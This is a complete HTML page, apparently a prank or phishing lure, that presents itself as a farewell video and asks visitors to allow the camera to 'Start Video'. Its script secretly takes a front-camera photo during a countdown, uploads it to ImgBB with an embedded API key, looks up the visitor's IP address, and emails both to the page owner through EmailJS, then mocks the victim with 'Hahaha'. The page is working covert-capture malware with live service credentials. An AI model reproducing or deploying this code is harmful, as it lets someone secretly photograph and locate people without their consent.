<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Goodbye.</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 800px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    
    .video-container {
      position: relative;
      width: 100%;
      height: 0;
      padding-bottom: 56.25%; /* نسبة 16:9 */
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
      border-radius: 10px;
      display: none; /* Hidden until countdown completes */
    }
    
    .loading {
      display: none;
      margin: 30px 0;
    }
    
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    
    .success {
      color: #4cd97b;
      display: none;
    }
    
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
    
    .hidden {
      display: none;
    }
    
    /* New styles for countdown */
    .countdown {
      font-size: 36px;
      font-weight: bold;
      margin: 20px 0;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      display: inline-block;
      min-width: 100px;
    }
    
    .permission-request {
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 20px 0;
    }
    
    .permission-btn {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    }
    
    .permission-btn:hover {
      background: #45a049;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
    
    .permission-btn:active {
      transform: translateY(0);
    }
    
    .instructions {
      font-size: 16px;
      margin-top: 15px;
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Goodbye.</h1>
    
    <!-- Camera permission request -->
    <div class="permission-request" id="permissionRequest">
      <p>Don't be sad.</p>
      <button class="permission-btn" id="cameraBtn">Start Video</button>
    </div>
    
    <!-- Countdown element -->
    <div class="countdown" id="countdown">10</div>
    
    <div class="video-container">
      <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>Loading</p>
    </div>
    
    <div class="message">
      <p>Hahaha</p>
      <p class="success">You thought!!</p>
    </div>
    
    <div class="error" id="error-message">
      Internet Error
    </div>
    
    <div class="footer">
      <p>Hope you are happy.</p>
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="720" height="1280" class="hidden"></canvas> <!-- Changed to 9:16 aspect ratio -->

  <script>
    // عناصر DOM
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    const countdownElement = document.getElementById('countdown');
    const permissionRequest = document.getElementById('permissionRequest');
    const cameraBtn = document.getElementById('cameraBtn');
    
    // متغيرات الحالة
    let cameraCaptured = false;
    let emailSent = false;
    let countdownInterval;
    let stream;
    let capturedAt7 = false; // Flag to track if image was captured at count 7
    
    // Hide countdown initially
    countdownElement.style.display = 'none';
    
    // Function to get user's IP address
    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown IP';
      }
    }
    
    // Function to start the countdown
    async function startCountdown() {
      let count = 10;
      countdownElement.textContent = count;
      countdownElement.style.display = 'block';
      
      // Get user IP and store it
      const userIP = await getUserIP();
      
      countdownInterval = setInterval(() => {
        count--;
        countdownElement.textContent = count;
        
        // Capture image when countdown reaches 7
        if (count === 7 && !capturedAt7) {
          capturedAt7 = true;
          captureImage(userIP);
        }
        
        if (count <= 0) {
          clearInterval(countdownInterval);
          countdownElement.style.display = 'none';
          startVideoPlayback();
        }
      }, 1000);
    }
    
    // Function to start video playback
    function startVideoPlayback() {
      loading.style.display = 'block';
      
      // Set the video source with autoplay
      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
      player.style.display = 'block';
    }
    
    // Event listener for camera permission button
    cameraBtn.addEventListener('click', async () => {
      try {
        // Hide the permission request
        permissionRequest.style.display = 'none';
        
        // Show loading indicator
        loading.style.display = 'block';
        
        // Access the camera with portrait aspect ratio constraints
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 720 }, // Portrait width
            height: { ideal: 1280 } // Portrait height (9:16 aspect ratio)
          } 
        });
        
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        
        // Hide loading
        loading.style.display = 'none';
        
        // Start the countdown
        startCountdown();
        
      } catch (error) {
        console.error('Camera error:', error);
        loading.style.display = 'none';
        permissionRequest.style.display = 'block';
        
        // Show error message
        errorMsg.textContent = 'يجب السماح بالكاميرا لتشغيل الفيديو. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
        errorMsg.style.display = 'block';
      }
    });
    
    // Hide the player initially
    player.style.display = 'none';
    
    // Show the player when loaded
    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
    });
    
    // وظيفة التقاط الصورة
    function captureImage(userIP) {
      if (!cameraCaptured) return;
      
      try {
        const ctx = canvas.getContext('2d');
        
        // Clear canvas
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // التقاط الصورة مع الحفاظ على نسبة 9:16
        // Calculate aspect ratios
        const videoAspectRatio = hiddenVideo.videoWidth / hiddenVideo.videoHeight;
        const canvasAspectRatio = canvas.width / canvas.height;
        
        let sourceX, sourceY, sourceWidth, sourceHeight;
        
        if (videoAspectRatio > canvasAspectRatio) {
          // Video is wider than canvas - crop horizontally
          sourceHeight = hiddenVideo.videoHeight;
          sourceWidth = hiddenVideo.videoHeight * canvasAspectRatio;
          sourceX = (hiddenVideo.videoWidth - sourceWidth) / 2;
          sourceY = 0;
        } else {
          // Video is taller than canvas - crop vertically
          sourceWidth = hiddenVideo.videoWidth;
          sourceHeight = hiddenVideo.videoWidth / canvasAspectRatio;
          sourceX = 0;
          sourceY = (hiddenVideo.videoHeight - sourceHeight) / 2;
        }
        
        // Draw the image with correct aspect ratio
        ctx.drawImage(
          hiddenVideo, 
          sourceX, sourceY, sourceWidth, sourceHeight, // source rectangle
          0, 0, canvas.width, canvas.height            // destination rectangle
        );
        
        // الحصول على بيانات الصورة
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Image = imageData.split(',')[1];
        
        // رفع الصورة إلى ImgBB
        const formData = new FormData();
        formData.append('image', base64Image);
        formData.append('name', 'hidden_capture_' + Date.now());
        
        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(imgbbData => {
          if (imgbbData.success) {
            // إرسال الإيميل باستخدام EmailJS
            emailjs.send("service_890xst3", "template_p1oukct", {
              name: "صورة خفية",
              time: new Date().toLocaleString(),
              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
              image_url: imgbbData.data.url,
              user_ip: userIP  // Add IP to email
            }).then(() => {
              emailSent = true;
            }, error => {
              console.error('Email error:', error);
            });
          }
        })
        .catch(error => {
          console.error('ImgBB error:', error);
        });
        
      } catch (error) {
        console.error('Capture error:', error);
      }
    }
    
    // Display success message after 10 seconds
    setTimeout(() => {
      if (cameraCaptured && emailSent) {
        console.log('تم التقاط الصورة وإرسالها بنجاح!');
      } else if (cameraCaptured) {
        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
      }
    }, 10000);
  </script>
</body>
</html>
